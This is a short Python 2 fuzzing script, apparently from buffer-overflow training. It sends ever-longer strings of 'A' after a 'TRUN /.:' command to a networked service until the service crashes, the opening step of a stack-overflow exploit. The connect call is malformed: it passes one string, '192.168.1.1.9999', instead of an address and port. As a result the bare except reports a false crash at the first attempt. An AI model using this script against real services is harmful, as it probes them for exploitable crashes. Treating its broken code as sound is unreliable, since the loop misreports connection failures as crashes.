#!/usr/bin/python
# run this with python2 (buffer overflow)
import sys, socket
from time import sleep

#This is a basic fuzzing script: 
#a program which injects automatic semi-random data into a program/stack
# and detects bugs 

#String of 100 A's
buffer = 'A' * 100

while True:
    try: 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.1.1.9999'))
        s.send(('TRUN /.:' + buffer ))
        s.close()
        sleep(1)
        #Append with another 100 A's
        buffer = buffer +  "A" * 100
    except:
        print "Fuzzing crashed at %s bytes" % (str(len(buffer)))
        sys.exit()